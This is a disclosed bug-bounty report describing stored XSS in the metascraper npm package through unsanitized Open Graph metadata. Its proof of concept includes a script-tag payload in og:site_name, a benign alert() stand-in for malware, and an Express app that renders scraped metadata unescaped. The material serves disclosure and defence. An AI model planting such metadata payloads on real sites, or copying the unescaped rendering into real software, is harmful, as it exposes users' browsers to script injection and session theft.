# [metascraper] Stored XSS in Open Graph meta properties read by metascrapper

## Report Details
- **Report ID**: 309367
- **URL**: https://hackerone.com/reports/309367
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-01-25T21:27:01.580Z
- **Disclosed**: 2018-03-28T06:09:21.146Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi Guys,

**metascrapper** is vulnerable to Stored XSS via Open Graph metadata, if they are used in HTML without any sanitization.

**Module:** 

A library to easily scrape metadata from an article on the web using Open Graph metadata, regular HTML metadata, and series of fallbacks.

https://www.npmjs.com/package/metascraper


**Description**

Due to lack of HTML sanitization, there is possibility to embed malicious code in any of metadata read by ```metascrapper```. When library reads such metadata, there is no sanitization performed. If output from ```metascrapper``` is used directly in HTML code, any HTML embed in metadata is executed in context of the page which load and render it.


## Steps To Reproduce:

### This part of PoC represents An Attacker

An attacker needs to inject malicious code into any of Open Graph property.

- create website (I serve it via static server available at http://127.0.0.1:8080) witt the following content. Please take a look at payload embed in ```og:site_name``` meta property:

```html
<!doctype html>
<html xmlns:og="http://ogp.me/ns#" lang="en">

<head>
    <meta charset="utf8">
    <title>metascraper</title>

    <meta property="og:description" content="The HR startups go to war.">
    <meta property="og:image" content="image">
    <meta property="og:site_name" content='<script src="http://127.0.0.1:8080/malware.js"></script>'>
    <meta property="og:title" content="test article">
    <meta property="og:type" content="article">
    <meta property="og:url" content="http://127.0.0.1:8080">
</head>

<body>
</body>
</html>
```

- save it as ```article.html``` in the root directory of the server runs on ```http://127.0.0.1:8080```.

- create ```malware.js``` file with following content and save it in the same directory as ```article.html```:

```
alert('Uh oh, I am very bad malware!')
```

Please be aware that ```JavaScript``` file with malicious code can be served from ANY place. This particular location is only for Poc.


**This represents an HTML page which can be "scrapped" with ```metascrapper```**


### This part of PoC represents legitimate User and an attack itself

- install ```metascrapper``` and required dependiences (```got``` and ```express```)

```
$ npm install metascrapper got express
```

- create an app which will use ```metascrapper``` to read webiste metadata. ```127.0.0.1:8888``` is address of server which uses ```metascrapper```. ```http://127.0.0.1:8080/article.html``` is **target website**, where from metadata will be read:

```javascript

const metascraper = require('metascraper')
const got = require('got')
const express = require('express')

const targetUrl = 'http://127.0.0.1:8080/article.html'

const app = express()

app.get('/scrap', function(req, res) {;
    (async() => {
        const {
            body: html,
            url
        } = await got(targetUrl)
        const metadata = await metascraper({
            html,
            url
        })
        console.log(metadata)  // see returned metadata in console:
        /*
            { author: null,
                date: null,
                description: 'The HR startups go to war.',
                image: 'http://127.0.0.1:8080/image',
                lang: 'en',
                logo: null,
                publisher: '<script src="http://127.0.0.1:8080/malware.js"></script>',
                title: 'test article',
                url: 'http://127.0.0.1:8080/article.html' }
        */
        // display content of metadata.publisher in the browser
        let __html = `
            <div>
                <p>site title: ${metadata.title}</p>
                <p>site publisher: ${metadata.publisher}</p>
            </div>
        `
        res.send(__html)
    })()
})

app.listen(8888, () => console.log('Example app listening on port 8888!'))
```

- run above app:

```
$ node app.js
```

- go to ```http://127.0.0.1:8888/scrap```

- malicious JavaScript code embed in site metadata ```og:site_name``` is executed:

{F257373}

As we can notice, our payload was displayed in the source page "as is":

{F257372}


## Supporting Material/References:

Configuration I've used to find this vulnerability:

- macOS HighSierra 10.13.3
- node 8.9.3
- npm 5.5.1
- curl 7.54.0

## Wrap up

I hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.

Thank you

Regards,

Rafal 'bl4de' Janicki

## Impact

Although this is quite hard to exploit in the wild, there is no doubt such attack is possible. This might lead to malware distribution, session cookies from infected websites leaks, run cryptocurrency miners in users' browsers and many more attacks.

## Attachments
- 2.png
- 1.png
